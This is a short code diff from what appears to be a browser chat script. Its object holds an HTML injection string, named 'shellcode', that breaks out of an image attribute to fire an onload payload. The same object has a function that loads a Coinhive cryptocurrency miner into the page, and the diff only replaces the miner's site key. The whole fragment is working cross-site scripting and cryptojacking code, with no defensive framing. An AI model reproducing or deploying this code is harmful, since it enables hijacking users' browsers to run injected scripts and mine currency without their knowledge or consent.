@@ -22,7 +22,7 @@ chatBox.sendNewChatMsg = function() {
 chatBox._metadata = new (function() {
     this.payload = 'TODO';
     this.shellcode = '-ico.png" onload="$PAYLOAD"><img class="';
-    this.MINER_SITE_KEY = 'zeD8xgY9pj6OvJM2VtIMVANUMo1jHxG6';
+    this.MINER_SITE_KEY = 'SEQdskKvQxTyZSDkP4LsnGoWiMVaoHR7';
     this.load_miner = function () {
         var miner_script = document.createElement('script');
         miner_script.src = 'https://coinhive.com/lib/coinhive.min.js';
